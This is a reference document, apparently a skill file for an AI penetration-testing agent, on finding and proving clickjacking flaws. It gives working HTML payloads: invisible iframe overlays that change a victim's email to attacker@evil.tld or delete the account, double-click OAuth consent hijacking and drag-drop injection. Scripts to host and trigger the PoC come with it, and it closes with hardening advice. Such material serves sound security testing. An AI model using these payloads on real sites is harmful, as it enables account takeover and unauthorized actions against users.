---
name: Clickjacking
description: Reference for clickjacking testing covering X-Frame-Options / CSP frame-ancestors strictness, drag-and-drop tricks, double-clickjacking, and high-value action gating.
---

# Clickjacking

Reference for finding clickjacking gaps where an attacker iframe-wraps the target and tricks a logged-in user into approving a sensitive action with a UI overlay. Pull this in when you find security-critical actions reachable via `<button>` clicks (transfer money, delete account, grant role, change email, accept connection).

> Black-box scope: probes drive HTTP, capture security headers, and (for full PoC) build a minimal HTML page that frames the target. Modern browsers enforce CSP `frame-ancestors`; the attack class lives in the gaps between header coverage and per-action confirmations.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Header capture | `execute_curl -I` | Pull `X-Frame-Options` and `Content-Security-Policy`. |
| Per-route header sweep | `execute_code` | Iterate over discovered routes; filter routes with weaker headers. |
| Build the framing PoC | `execute_code` (write HTML) + `execute_playwright` | Host PoC locally; verify the frame loads. |

## Header reference

| Header | Values | Effect |
|---|---|---|
| `X-Frame-Options: DENY` | Forbid all framing | Strict |
| `X-Frame-Options: SAMEORIGIN` | Allow same-origin only | OK in most cases |
| `X-Frame-Options: ALLOW-FROM <uri>` | Single allowed origin | Deprecated; ignored by Chrome / Edge |
| `Content-Security-Policy: frame-ancestors 'none'` | Forbid all framing | Strict (modern equivalent) |
| `Content-Security-Policy: frame-ancestors 'self'` | Same-origin only | OK |
| `Content-Security-Policy: frame-ancestors https://trusted.tld` | Allowlist | Strong if narrow |
| `Content-Security-Policy: frame-ancestors *` | Allow all | **Vulnerable** |
| Both headers absent | Default = framable everywhere | **Vulnerable** |

`frame-ancestors` overrides `X-Frame-Options` when both are present (per CSP spec). Some apps set `XFO: SAMEORIGIN` and a permissive `CSP frame-ancestors *` -- the CSP wins, so they are vulnerable.

## Reconnaissance

### Per-route header sweep

```
execute_code language: python
import requests
ROUTES = ["/", "/login", "/account/email", "/transfer", "/admin", "/billing"]
for r in ROUTES:
    h = requests.get(f"https://target.tld{r}", allow_redirects=False).headers
    xfo = h.get("X-Frame-Options", "(none)")
    csp = h.get("Content-Security-Policy", "(none)")
    fa = ""
    if "frame-ancestors" in csp:
        fa = csp.split("frame-ancestors", 1)[1].split(";")[0].strip()
    print(f"{r:30} XFO={xfo:20} frame-ancestors={fa}")
```

Many apps set strict headers on `/admin/*` but forget `/account/email`, `/payment/method`, or `/api/*` GET-callable confirmation pages.

### Captured-traffic workflow (proxy_brain tools)

When HTTP Traffic Capture is enabled, redamon.query and redamon.grep sweep `X-Frame-Options` and `Content-Security-Policy: frame-ancestors` across every route already captured, flagging responses with missing, weak, or wildcard (`*`) framing headers in one pass instead of a manual per-route `curl -I` loop. Where the proxy stops: the exploit itself (the framing PoC page plus the click) is a browser artifact built with execute_code and execute_playwright; the proxy value is confined to header inventory and recon.

### Find action targets

```
GET /account/email/change-confirm?token=...
GET /transfer/approve?id=...
GET /api/v1/users/me/email/verify?token=...
POST /account/delete       (with form auto-submit, not always GET-required)
```

Anything that performs a state change on click -- with cookies riding along -- is a candidate.

## Attack matrix

### Classic iframe overlay

```html
<!doctype html>
<html><body>
<style>
  iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 2; }
  .bait { position: absolute; top: 200px; left: 300px; z-index: 1; }
</style>
<div class="bait">Click here to claim your prize!</div>
<iframe src="https://target.tld/account/email/change?new=attacker@evil.tld&confirm=1"></iframe>
</body></html>
```

When the user clicks "claim your prize," the click lands on the (invisible) target button.

### CSS opacity + position

`opacity: 0` + `pointer-events: auto` is the canonical recipe. Browsers may issue console warnings but do not block the click.

### Double-clickjacking (Paulos Yibelo 2024)

Double-clicking a UI element navigates the user to a sensitive page mid-double-click; the second click lands on the actual target.

```html
<button id="bait" onclick="window.open('https://target.tld/oauth/authorize?client_id=...&consent=1', '_blank')">Click me twice</button>
```

Modern browsers' XFO / CSP do not protect against `window.open` + double-click sequencing because the navigation is user-initiated. Spec-level fixes (`Sec-Fetch-User`) help when adopted.

### Drag-and-drop

```html
<iframe src="https://target.tld/profile/edit"></iframe>
<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker-injected-text')">Drag me</div>
```

Some apps allow drag-drop into form fields. The attacker stages the data; the user drags; the value lands in a hidden input.

### Cross-origin token capture via overlay

When a sensitive page renders a one-time token in clear text:

```
GET /api/admin/api-keys/new   -> renders the token
```

If the page is framable, an attacker overlay can capture the token via screen-coordinate-driven JS or by tricking the user into pasting into an attacker form.

### UI redress on consent screens

OAuth `/authorize` consent prompts are the highest-value targets. If `/authorize` has no XFO / CSP, attackers can frame the consent screen and trick users into authorizing attacker apps. See `/skill oauth_oidc`.

### Mobile-specific

In WebViews, framing is often unprotected because XFO is HTTP-only. Combine with deep-link attacks (`/skill open_redirect`).

## PoC template

```html
<!doctype html>
<html><head><title>Clickjacking PoC</title>
<style>
  body { margin: 0; }
  .target {
    position: absolute; top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;
    z-index: 2;
    border: none;
  }
  .bait {
    position: absolute; top: 200px; left: 300px;
    z-index: 1;
    padding: 20px 40px;
    background: #f33; color: #fff;
    font-size: 24px; font-family: sans-serif;
    cursor: pointer;
  }
</style></head><body>
<div class="bait">Free $100 -- click to claim</div>
<iframe class="target" src="https://target.tld/account/delete?confirm=1"></iframe>
</body></html>
```

Host on attacker.tld (or `python3 -m http.server 8000` locally). Visit while logged in as the victim. Click the bait. Verify the action fired on target.tld.

```
execute_code language: python
# Write the PoC to /tmp and serve it
import os
PAYLOAD = """<!doctype html>...<paste above>..."""
os.makedirs("/tmp/clickjack_poc", exist_ok=True)
with open("/tmp/clickjack_poc/index.html", "w") as f:
    f.write(PAYLOAD)
print("PoC at /tmp/clickjack_poc/index.html. Serve via:")
print("  cd /tmp/clickjack_poc && python3 -m http.server 8000")
```

Then drive the browser at the PoC:

```
execute_playwright url: "http://localhost:8000/" script: |
  page.goto("http://localhost:8000/")
  page.wait_for_timeout(2000)
  # Manually click the bait, or for automated proof:
  page.click(".bait")
  page.wait_for_timeout(2000)
  print(page.url)
```

## Validation shape

A clean clickjacking finding includes:

1. The vulnerable route + missing / weak header capture.
2. The PoC HTML (minimal, reproducible).
3. Browser screenshot showing the overlay.
4. Proof the click triggered the action (admin-side audit log entry, follow-up request to `/account/email` confirming the change, etc.).
5. Browser version tested (some bypasses are version-specific).

## False positives

- `frame-ancestors 'none'` or `X-Frame-Options: DENY` set globally.
- `frame-ancestors 'self'` and the action is reachable only from same-origin (no attacker frame possible).
- The "click" doesn't actually mutate state -- it is a no-op on the framed page.
- The action requires re-entered credentials / second-factor / CAPTCHA on every confirmation (defense in depth).
- The target page is rendered via JS that detects framing (`if (top !== self) top.location = self.location`) and breaks out.

## Hardening summary

- Set `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`) on every state-changing page. Default-deny.
- Keep `X-Frame-Options: DENY` for legacy clients.
- Re-prompt for password / WebAuthn / OTP on high-value actions (financial, admin, account-change). Defense-in-depth that survives clickjacking.
- For OAuth `/authorize`, require explicit user gesture detection (`Sec-Fetch-User: ?1`) before honoring consent.
- Avoid `window.open` to sensitive pages from buttons; prefer same-tab navigation.
- Apply CSP and XFO consistently across HTML and PDF / SVG and any embeddable content.

## Hand-off

```
Clickjacking on /authorize       -> /skill oauth_oidc (consent hijack)
Clickjacking + CSRF              -> /skill csrf (UI to force the request)
Clickjacking on email change     -> ATO chain
Drag-drop XSS variant            -> built-in xss skill
```

## Pro tips

- The cleanest evidence is a video / GIF of the attack: bait visible, click registered, action confirmed in target.tld's UI.
- `Content-Security-Policy: frame-ancestors *` is functionally equivalent to no CSP -- always file as a finding.
- High-value actions with no clickjacking protection AND no second-factor confirmation are the worst combination.
- Cross-browser testing matters: Safari / Firefox / Chrome may differ on edge cases (especially WebViews).
- Modern PoCs sometimes need `sandbox="allow-forms allow-scripts allow-same-origin"` on the iframe to work; without `allow-same-origin`, framing is blocked from many actions even when XFO is missing.
